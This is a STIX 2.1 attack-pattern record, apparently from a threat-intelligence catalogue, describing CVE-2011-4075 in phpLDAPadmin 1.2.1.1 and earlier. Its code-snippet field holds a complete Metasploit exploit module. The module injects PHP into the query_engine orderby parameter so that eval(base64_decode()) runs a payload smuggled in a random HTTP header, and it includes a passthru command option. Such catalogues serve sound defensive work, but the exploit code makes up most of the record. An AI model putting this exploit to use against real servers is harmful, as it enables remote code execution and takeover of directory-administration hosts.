{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--13a44e6b-b1e1-415c-986a-6e5ac2c9b295",
    "created": "2024-08-14T17:07:29.615533Z",
    "modified": "2024-08-14T17:07:29.615537Z",
    "name": "phpLDAPadmin query_engine Remote PHP Code Injection",
    "description": " This module exploits a vulnerability in the lib/functions.php for phpLDAPadmin versions 1.2.1.1 and earlier that allows attackers input parsed directly to the create_function() php function. A patch was issued that uses a whitelist regex expression to check the user supplied input before being parsed to the create_function() call. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/phpldapadmin_query_engine.rb",
            "external_id": "phpldapadmin_query_engine.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4075"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'phpLDAPadmin query_engine Remote PHP Code Injection',\n      'Description'    => %q{\n        This module exploits a vulnerability in the lib/functions.php for\n        phpLDAPadmin versions 1.2.1.1 and earlier that allows attackers input\n        parsed directly to the create_function() php function. A patch was\n        issued that uses a whitelist regex expression to check the user supplied\n        input before being parsed to the create_function() call.\n      },\n      'Author'         =>\n        [\n          'EgiX <n0b0d13s[at]gmail.com>',               # original discovery/poc\n          'mr_me <steventhomasseeley[at]gmail.com>',    # msf\n          'TecR0c <roccogiovannicalvi[at]gmail.com >',  # msf\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2011-4075'],\n          ['OSVDB', '76594'],\n          ['BID', '50331'],\n          ['EDB', '18021']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 4000,\n          'Keys'        => ['php'],\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2011-10-24',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('URI', [true, \"phpLDAPadmin directory path\", \"/phpldapadmin/htdocs/\"]),\n        ])\n  end\n\n  def check\n    uri = normalize_uri(datastore['URI'], 'index.php')\n\n    res = send_request_raw(\n      {\n        'method'  => 'GET',\n        'uri' => uri,\n      }, 3)\n\n    if (res and res.body =~ /phpLDAPadmin \\(1\\.2\\.[0|1]\\.\\d/i)\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def get_session\n    uri = normalize_uri(datastore['URI'], 'index.php')\n\n    res = send_request_raw(\n      {\n        'method'  => 'GET',\n        'uri' => uri,\n      }, 3)\n\n    if res.nil? or res.get_cookies.empty?\n      print_error(\"Could not generate a valid session\")\n      return\n    end\n\n    return res.get_cookies\n  end\n\n  def exploit\n    # if we are using the exec CMD stager\n    # important to check which php functions are disabled\n    if datastore['CMD']\n      p = \"passthru(\\\"%s\\\");\" % datastore['CMD']\n      p = Rex::Text.encode_base64(p)\n    else\n      p = Rex::Text.encode_base64(payload.encoded)\n    end\n\n    # Generate some random strings\n    hidden_header = rand_text_alpha_upper(6)\n    fake_func_name = rand_text_alpha_upper(2)\n\n    # build sttack string\n    php_code = \"#{fake_func_name}));}}error_reporting(0);eval(base64_decode(\\$_SERVER[HTTP_#{hidden_header}]));die;/*\"\n    data = \"cmd=query_engine&query=none&search=1&orderby=#{php_code}\\r\\n\\r\\n\"\n    session = get_session\n\n    uri = normalize_uri(datastore['URI'])\n    uri << '/' if uri[-1,1] != '/'\n    uri << 'cmd.php'\n\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri' => uri,\n        'data' => data,\n        'headers' =>\n          {\n            \"#{hidden_header}\" => p,\n            'Cookie' => session,\n            'Connection' => 'Close',\n          },\n      }, 3)\n\n    print_status(\"%s\" % res.body) if datastore['CMD']\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-10-24",
    "x_mitre_platforms": [
        "['php']"
    ]
}